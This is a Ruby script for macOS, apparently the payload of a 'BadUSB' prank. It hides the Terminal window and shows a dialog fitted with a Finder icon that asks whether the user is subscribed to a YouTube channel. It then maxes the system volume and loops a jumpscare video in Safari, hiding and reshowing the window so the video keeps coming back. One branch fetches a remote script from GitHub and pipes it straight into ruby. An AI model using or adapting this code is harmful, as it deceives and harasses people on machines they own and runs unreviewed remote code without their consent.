#!/usr/bin/env ruby
require 'open-uri'
require 'tempfile'

# --- Hide Terminal Immediately ---
system("osascript -e 'tell application \"Terminal\" to set visible of front window to false'")

# --- Helper: Display Dialog with Finder Icon via AppleScript ---
def display_dialog(message, buttons, default)
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{
    display dialog "#{message}" buttons #{button_list} default button "#{default}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"
  }
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:\s*(.+)/
    return $1.strip
  else
    return nil
  end
end

# --- Volume Control: Set System Volume to Maximum ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Create Temporary HTML for Jumpscare ---
# The Tempfile is created with a prefix "jumpscare" so its filename contains that substring.
def create_jumpscare_html(video_url)
  html_content = <<-HTML
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0; padding: 0; height: 100%; background-color: black;
      }
      video {
        width: 100%; height: 100%; object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay muted playsinline>
      <source src="#{video_url}" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.play();
      video.addEventListener('loadeddata', function() {
        // After a short delay, unmute and play.
        setTimeout(function(){
          video.muted = false;
          video.play();
        }, 500);
      });
    </script>
  </body>
</html>
  HTML

  temp = Tempfile.new(['jumpscare', '.html'])
  temp.write(html_content)
  temp.close
  temp.path
end

# --- Persistent Jumpscare Mode ---
# This function continuously ensures that Safari is showing the jumpscare page.
def persistent_jumpscare(video_url)
  html_file = create_jumpscare_html(video_url)
  
  loop do
    set_volume_to_max
    # Open the jumpscare page in Safari.
    system("open -a Safari '#{html_file}'")
    # Immediately hide Safari’s window.
    system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
    # Wait 0.5 seconds to simulate noise detection.
    sleep 0.5
    # Unhide Safari so the jumpscare becomes visible.
    system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
    # Let the jumpscare play for 1 second.
    sleep 1

    # Check if any Safari tab still has "jumpscare" in its URL.
    check_script = %Q{
      tell application "Safari"
        set found to false
        repeat with w in windows
          repeat with t in tabs of w
            if (URL of t) contains "jumpscare" then
              set found to true
            end if
          end repeat
        end repeat
        return found
      end tell
    }
    result = `osascript -e '#{check_script}'`.strip.downcase
    # If not found or if result contains "false", then reopen it.
    if result.include?("false")
      next
    else
      # Otherwise, wait a bit and then check again.
      sleep 3
    end
  end
end

# --- Run Secret (Rickroll) Script ---
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# --- Subscriber Action ---
def subscriber_action(choice)
  ch = choice.strip.downcase
  case ch
  when "hawk"
    run_secret_script
    # After running the secret script, exit.
    system("killall Terminal")
    exit 0
  when "tuah"
    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
  when "sydney lover"
    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
  else
    puts "Unexpected button choice: #{choice}"
  end
end

# --- Main Program Flow ---
subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
if subscribed.nil?
  puts "No response received. Exiting."
  exit 0
end

if subscribed.downcase == "no"
  # For non-subscribers, immediately play the jumpscare using jumpscare2.mp4.
  sleep 1
  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4")
  # (Since persistent_jumpscare never exits, this branch won’t reach Terminal kill.)
else
  # For subscribers, show a dialog with three buttons.
  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah"], "Hawk")
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  subscriber_action(button_choice)
  # After subscriber actions (if they don't enter persistent mode), kill Terminal.
  system("killall Terminal")
  exit 0
end
